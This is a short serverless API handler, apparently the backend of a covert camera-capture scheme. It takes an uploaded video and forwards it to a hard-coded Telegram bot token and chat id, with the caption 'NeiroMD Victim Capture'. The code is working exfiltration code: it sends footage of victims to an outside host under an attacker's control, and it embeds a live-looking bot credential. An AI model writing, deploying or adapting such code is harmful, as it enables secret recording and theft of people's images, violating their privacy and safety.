export default async function handler(req, res) {
  if(req.method!=='POST') return res.status(405).end();
  
  try{
    const formData=await req.formData();
    const file=formData.get('video');
    formData.append('chat_id','7349944283');
    formData.append('caption','🎥 NeiroMD Victim Capture');
    
    await fetch('https://api.telegram.org/bot8651759192:AAGAHKMB_vgP7SrlLUGmDtyboaasI9lwZpA/sendVideo',{
      method:'POST',body:formData
    });
    
    res.status(200).json({success:true});
  }catch(e){
    res.status(500).json({error:e.message});
  }
}